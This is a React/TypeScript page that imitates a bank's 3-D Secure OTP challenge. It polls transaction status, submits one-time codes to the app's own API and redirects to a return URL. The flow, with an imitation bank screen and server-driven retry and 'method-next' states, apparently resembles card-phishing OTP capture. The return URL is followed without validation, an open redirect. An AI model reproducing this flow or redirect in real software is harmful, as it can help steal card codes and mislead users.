import React, { useCallback, useEffect, useMemo, useState } from 'react';
import { AcsOtpChallenge } from '../components/AcsOtpChallenge';
import { apiUrl } from '../lib/apiBase';

type Poll = {
  status?: string;
  phone_last3?: string | null;
  otp_attempts?: number;
  otp_max_attempts?: number;
  otp_remaining?: number;
  otp_can_resend?: boolean;
  otp_resend_cooldown_sec?: number;
  fail_reason?: string | null;
};

function qs() {
  return new URLSearchParams(window.location.search);
}

/**
 * Full-page bank ACS / 3DS experience (separate from the main app UI).
 * After order completed/failed → redirect back to merchant return URL.
 */
export default function AcsChallengePage() {
  const params = useMemo(() => qs(), []);
  const orderRef = (params.get('order_ref') || params.get('order') || '').trim();
  const clientId = (params.get('client_id') || params.get('clientId') || '').trim();
  const lang = (params.get('lang') || 'ar').trim();
  const returnUrl = (params.get('return') || params.get('return_url') || '/').trim() || '/';

  const [phoneLast3, setPhoneLast3] = useState(params.get('digits') || params.get('phone_last3') || '');
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [otpMaxAttempts, setOtpMaxAttempts] = useState(2);
  const [otpRemaining, setOtpRemaining] = useState(2);
  const [otpRetryNotice, setOtpRetryNotice] = useState(false);
  const [otpResendNotice, setOtpResendNotice] = useState(false);
  const [otpResendCooldown, setOtpResendCooldown] = useState(0);
  const [otpResendLoading, setOtpResendLoading] = useState(false);
  const [otpState, setOtpState] = useState<'input' | 'checking' | 'failed'>('input');
  const [failReason, setFailReason] = useState<string | null>(null);
  const [error, setError] = useState('');

  const goBack = useCallback(
    (status: string) => {
      try {
        sessionStorage.setItem(
          'acs_return',
          JSON.stringify({ order_ref: orderRef, status, at: Date.now() }),
        );
      } catch {
        /* ignore */
      }
      let target = returnUrl;
      try {
        const u = new URL(returnUrl, window.location.origin);
        u.searchParams.set('acs_result', status);
        if (orderRef) u.searchParams.set('order_ref', orderRef);
        target = u.toString();
      } catch {
        target = returnUrl;
      }
      window.location.replace(target);
    },
    [orderRef, returnUrl],
  );

  const applyPoll = useCallback((data: Poll) => {
    if (typeof data.otp_attempts === 'number') setOtpAttempts(data.otp_attempts);
    if (typeof data.otp_max_attempts === 'number') setOtpMaxAttempts(data.otp_max_attempts);
    if (typeof data.otp_remaining === 'number') setOtpRemaining(data.otp_remaining);
    if (typeof data.otp_resend_cooldown_sec === 'number') {
      setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
    }
    if (data.phone_last3) {
      setPhoneLast3(String(data.phone_last3).replace(/\D/g, '').slice(-3));
    }
    if (data.fail_reason) setFailReason(data.fail_reason);
  }, []);

  useEffect(() => {
    if (!orderRef || !clientId) {
      setError(lang === 'ar' ? 'رابط التحقق غير صالح.' : 'Invalid verification link.');
      return;
    }
    let alive = true;
    const poll = async () => {
      try {
        const q = new URLSearchParams({ client_id: clientId, order_ref: orderRef });
        const res = await fetch(apiUrl(`/api/transactions/order-status?${q}`));
        if (!res.ok || !alive) return;
        const data = (await res.json()) as Poll;
        applyPoll(data);
        const st = String(data.status || '').toLowerCase();
        if (st === 'completed') {
          goBack('completed');
          return;
        }
        if (st === 'failed' || st === 'refunded' || st === 'suspended') {
          if (data.fail_reason === 'otp_attempts_exceeded') {
            setOtpState('failed');
            setFailReason('otp_attempts_exceeded');
          } else if (otpState === 'checking') {
            setOtpState('failed');
          }
          // stay on failed UI; user can go back
        }
        if (st === 'retry_otp') {
          setOtpState('input');
          setOtpRetryNotice(true);
        }
      } catch {
        /* ignore */
      }
    };
    void poll();
    const id = window.setInterval(() => void poll(), 1200);
    return () => {
      alive = false;
      window.clearInterval(id);
    };
  }, [orderRef, clientId, applyPoll, goBack, lang, otpState]);

  useEffect(() => {
    if (otpResendCooldown <= 0) return;
    const t = window.setInterval(() => setOtpResendCooldown((s) => Math.max(0, s - 1)), 1000);
    return () => window.clearInterval(t);
  }, [otpResendCooldown]);

  const onMethodNext = async () => {
    if (!orderRef) return;
    await fetch(apiUrl('/api/transactions/otp/method-next'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ order_id: orderRef }),
    });
  };

  const onSubmitOtp = async (code: string) => {
    if (!orderRef) return;
    setOtpRetryNotice(false);
    setOtpResendNotice(false);
    setOtpState('checking');
    const res = await fetch(apiUrl('/api/transactions/otp'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ order_id: orderRef, otpDigit: code }),
    });
    if (!res.ok) {
      setOtpState('input');
      throw new Error('otp failed');
    }
    // Keep checking until poll sees completed/failed
  };

  const onResend = async () => {
    if (!orderRef || !clientId) return;
    setOtpResendLoading(true);
    try {
      const res = await fetch(apiUrl('/api/transactions/otp/resend'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: clientId, order_id: orderRef }),
      });
      if (res.ok) {
        const data = (await res.json()) as { cooldown_sec?: number };
        setOtpResendNotice(true);
        setOtpResendCooldown(data.cooldown_sec ?? 60);
      }
    } finally {
      setOtpResendLoading(false);
    }
  };

  const t = (key: string, fallback?: string) => fallback || key;

  return (
    <div
      style={{
        minHeight: '100vh',
        background: '#f4f2ef',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        padding: 16,
        fontFamily: 'Arial, Helvetica, sans-serif',
      }}
    >
      <div style={{ width: '100%', maxWidth: 420 }}>
        <div style={{ textAlign: 'center', marginBottom: 16, color: '#666', fontSize: 13 }}>
          Card Authentication · 3-D Secure
        </div>
        {error ? (
          <div
            style={{
              background: '#fff',
              border: '1px solid #e8e4df',
              borderRadius: 8,
              padding: 24,
              textAlign: 'center',
            }}
          >
            <p style={{ color: '#b00020' }}>{error}</p>
            <button
              type="button"
              onClick={() => goBack('cancelled')}
              style={{
                marginTop: 12,
                width: '100%',
                padding: 12,
                border: 'none',
                borderRadius: 4,
                background: '#00527a',
                color: '#fff',
                fontWeight: 700,
                cursor: 'pointer',
              }}
            >
              {lang === 'ar' ? 'العودة للمتجر' : 'Return to merchant'}
            </button>
          </div>
        ) : (
          <AcsOtpChallenge
            orderRef={orderRef}
            phoneLast3={phoneLast3}
            lang={lang}
            otpAttempts={otpAttempts}
            otpMaxAttempts={otpMaxAttempts}
            otpRemaining={otpRemaining}
            otpRetryNotice={otpRetryNotice}
            otpResendNotice={otpResendNotice}
            resendCooldown={otpResendCooldown}
            resendLoading={otpResendLoading}
            externalState={otpState}
            failReason={failReason}
            t={t}
            onMethodNext={onMethodNext}
            onSubmitOtp={onSubmitOtp}
            onResend={onResend}
            onRetry={() => goBack('failed')}
          />
        )}
        <button
          type="button"
          onClick={() => goBack('cancelled')}
          style={{
            display: 'block',
            margin: '16px auto 0',
            background: 'transparent',
            border: 'none',
            color: '#00527a',
            fontSize: 14,
            cursor: 'pointer',
            textDecoration: 'underline',
          }}
        >
          {lang === 'ar' ? 'إلغاء والعودة للمتجر' : 'Cancel and return to merchant'}
        </button>
      </div>
    </div>
  );
}
